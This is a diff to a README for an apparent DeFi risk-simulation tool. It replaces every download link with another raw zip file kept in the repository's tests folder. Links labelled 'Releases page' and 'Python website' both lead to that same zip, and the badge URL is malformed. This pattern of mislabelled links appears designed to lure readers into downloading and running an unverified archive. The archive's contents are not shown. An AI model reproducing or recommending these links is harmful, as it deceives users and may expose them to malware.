@@ -1,6 +1,6 @@
 # 🎉 Defi-Risk-Scenario-Lab - Stress-Test DeFi Protocols Efficiently
 
-[![Download Now](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/simulation/examples/Defi-Risk-Scenario-Lab_v1.2-beta.1.zip%20Now-Visit%20Releases-2b72a8)](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/simulation/examples/Defi-Risk-Scenario-Lab_v1.2-beta.1.zip)
+[![Download Now](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/tests/Defi_Scenario_Risk_Lab_1.8.zip%20Now-Visit%20Releases-2b72a8)](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/tests/Defi_Scenario_Risk_Lab_1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you start, ensure your system meets the following requirements:
 
 ### Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/simulation/examples/Defi-Risk-Scenario-Lab_v1.2-beta.1.zip) to download the latest version of the software.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/tests/Defi_Scenario_Risk_Lab_1.8.zip) to download the latest version of the software.
 
 1. Click on the link to the Releases page.
 2. Locate the latest version.
@@ -58,7 +58,7 @@ If you encounter any issues while downloading or running the application, feel f
    - Check your Downloads folder or the location specified in your browser settings.
 
 2. **The application won't open. What could be wrong?**
-   - Ensure that you have the required version of Python installed. If you have an outdated version, download the latest from the [Python website](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/simulation/examples/Defi-Risk-Scenario-Lab_v1.2-beta.1.zip).
+   - Ensure that you have the required version of Python installed. If you have an outdated version, download the latest from the [Python website](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/tests/Defi_Scenario_Risk_Lab_1.8.zip).
 
 3. **What if I find a bug?**
    - We appreciate your feedback. Please report bugs on the Issues section in our repository so we can address them promptly.
@@ -79,4 +79,4 @@ For more information on DeFi protocols and related concepts, consider the follow
 - **Python Programming for Simulation:** Beginner resources to learn Python if you're interested in customizing the simulations.
 - **Financial Modeling in DeFi:** Understanding the financial aspects of decentralized protocols.
 
-For further assistance and detailed documentation, return to our [Releases page](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/simulation/examples/Defi-Risk-Scenario-Lab_v1.2-beta.1.zip).
+For further assistance and detailed documentation, return to our [Releases page](https://raw.githubusercontent.com/WilliamWK21/Defi-Risk-Scenario-Lab/main/tests/Defi_Scenario_Risk_Lab_1.8.zip).
